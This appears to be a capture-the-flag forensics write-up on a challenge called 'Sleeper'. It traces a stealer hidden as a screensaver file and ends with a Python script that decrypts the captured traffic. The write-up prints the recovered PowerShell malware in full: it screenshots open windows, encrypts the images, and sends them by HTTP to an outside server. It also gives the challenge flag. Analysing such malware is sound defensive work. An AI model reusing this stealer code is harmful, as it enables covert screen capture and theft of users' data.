---
icon: fingerprint
---

# Sleeper

### Description

Author: Blacowhait

Wareth is a person who always leaving her laptop without sleep, lock, or anything he doing self. He only depend to windows feature for automate handle her laptop. Someday he cant access her account! he said he dont do anything suspicious, but few hours ago he install an app for internet. Can you helpp?!

### Flag

`CJ{stealer_everywhere__becareful_what_in/on/at_internet}`

***

### Analysis

We are given a network packet capture file and an `ad1` image file. From the packet capture, we can infer that data is transmitted using HTTP through the query parameter. The last part of the key contains the index and the value contains the data itself.

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption><p>Query parameter from Wireshark</p></figcaption></figure>

After analyzing the disk image, we found new files on the `C:\Windows\SysWOW64` directory. One is a screensaver file and another an executable.

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption><p>Files on C:\Windows\SysWOW64</p></figcaption></figure>

The `chkmnt.exe` executable is just a normal screen capture application. But the `sconsvr.scr` file is interesting. Since `.scr` files are basically PE executables, we can reverse-engineer it using DNSpy.

From DNSpy, we found a resource called `ss-all-proc.ps1` inside the executable. This script will take a screenshot of every process, encrypts them using AES, and then sends it as an HTTP request just like the one we found on the packet capture.

Credits to **aster** for finding these files.

```powershell
function Encrypt-File {
    param (
        [string]$D783C0,
        [string]$6766A9,
        [string]$92EE28
    )

    Write-Output $6766A9
    Write-Output $92EE28

    $4099D1 = [System.Text.Encoding]::UTF8.GetBytes($6766A9)
    $68263A = [System.Text.Encoding]::UTF8.GetBytes($92EE28)

    if ($4099D1.Length -ne 16 -and $4099D1.Length -ne 24 -and $4099D1.Length -ne 32) {
        throw "ERROR"
    }
    if ($68263A.Length -ne 16) {
        throw "ERROR"
    }

    $88DB2B = New-Object "System.Security.Cryptography.AesManaged"
    $88DB2B.Key = $4099D1
    $88DB2B.IV = $68263A
    $88DB2B.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $88DB2B.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $BDAE58 = [System.IO.File]::ReadAllBytes($D783C0)

    $FF85F8 = $88DB2B.CreateEncryptor()
    $42B0F0 = $FF85F8.TransformFinalBlock($BDAE58, 0, $BDAE58.Length);
    [byte[]] $C81F44 = $88DB2B.IV + $42B0F0
    $88DB2B.Dispose()
    $res = [Convert]::ToBase64String($C81F44)
    return $res
}

# $processArray = Get-Process | Where-Object {$_.mainWindowTitle} | Select-Object ProcessName
$processArray = Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object MainWindowTitle

foreach ($process in $processArray) {
    $tmp = $process.MainWindowTitle
    $filePath = "C:\Users\Public\Pictures\tmp.png"
    $command = "C:\Windows\SysWOW64\chkmnt.exe $filepath $tmp"
    Invoke-Expression $command

    $regValue = "HKCU:\Control Panel\Desktop"
    $value = (Get-ItemProperty -Path $regValue -Name "ScreenSaveTimeout")."ScreenSaveTimeout"
    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $key = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })
    Write-Output $key

    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $IV = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })

    $base64Encoded = Encrypt-File $filePath $key $IV
    $base64Encoded = $base64Encoded[2]
    $chunkSize = 1024
    $totalChunks = [math]::Ceiling($base64Encoded.Length / $chunkSize)
    $baseUrl = 'http://10.21.69.4:8081'

    for ($i = 0; $i -lt $totalChunks; $i++) { 
        $startIndex = $i * $chunkSize; $length = [math]::Min($chunkSize, $base64Encoded.Length - $startIndex)
        $chunk = $base64Encoded.Substring($startIndex, $length)
        $chunkUrlEncoded = [System.Net.WebUtility]::UrlEncode($chunk)
        $fullUrl = "${baseUrl}?vBRqSiWY$i=$chunkUrlEncoded"
	Write-Output $fullUrl
        $response = Invoke-RestMethod -Uri $fullUrl -Method Get
    }

    Remove-Item -Path $filePath
}

$scrnsave = "C:\Windows\SysWOW64\angi.exe"
Invoke-Expression $scrnsave
```

We can see that the IV will be prefixed when the data is sent using HTTP, but how do we actually get the key? Turns out the key and IV will be exactly the same, since we are using the same seed from the `HKCU:\Control Panel\Desktop\ScreenSaveTimeout` registry key.&#x20;

```powershell
# snip
    $value = (Get-ItemProperty -Path $regValue -Name "ScreenSaveTimeout")."ScreenSaveTimeout"
    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $key = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })
    Write-Output $key

    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $IV = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })
# snip
```

### Solution

The goal is that we need to decrypt the query parameter value from the HTTP packet using AES with the key and IV from the first 16 characters of the data, and assemble them based on the index on the query parameter key. After creating a script for that, we will get the flag from one of the screen captures.

<figure><img src="../../.gitbook/assets/decrypted_5.png" alt=""><figcaption><p>Screenshot containing the flag</p></figcaption></figure>

### Solver Script

```python
from scapy.all import *
from scapy.layers.http import *
from urllib.parse import unquote
from base64 import b64decode
from Crypto.Cipher import AES

res = [b""] * 1000
packets = rdpcap("./needsleeppls.pcap")
started = False
filecount = 1
key = b"EarWS9whYYeT2q8f"

for p in packets:
    if p.haslayer(IP) and p.haslayer(Raw):
        if p.getlayer(IP).dst == "10.21.69.4":
            payload = p.getlayer(Raw).load
            if b"GET /?vBRqSiWY" in payload:
                start = payload.index(b"=") + 1
                end = payload.index(b" HTTP")
                index_start = payload.index(b"WY") + 2
                index = int(payload[index_start:start-1])

                if index == 0 and started:
                    data = b64decode(b"".join(res))
                    data = data[16:]

                    cipher = AES.new(key, AES.MODE_CBC, key)
                    decrypted = cipher.decrypt(data)
                    with open(f"decrypted_{filecount}.png", "wb") as f:
                        f.write(decrypted)

                    res = [b""] * 1000
                    filecount += 1
                elif not started:
                    started = True

                payload = payload[start:end]
                payload = unquote(payload).encode("utf-8")

                res[index] = payload
```
